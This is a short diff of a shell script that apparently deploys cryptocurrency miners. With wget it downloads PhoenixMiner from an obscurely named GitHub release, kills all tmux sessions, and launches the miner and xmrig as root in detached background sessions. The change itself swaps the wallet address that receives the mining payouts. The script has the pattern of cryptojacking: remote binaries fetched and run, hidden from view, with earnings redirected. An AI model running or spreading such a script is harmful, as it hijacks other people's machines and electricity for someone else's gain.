@@ -19,5 +19,5 @@ wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Li
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
 tmux kill-server
 sleep 1
-sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0xE1dd842C70b83491173Df4061BA76Be9646b11E9.M2021 -pass x'
+sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0xa4c5a0f1085edff61a41a1b51817860ed45731c2.D2021 -pass x'
 sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
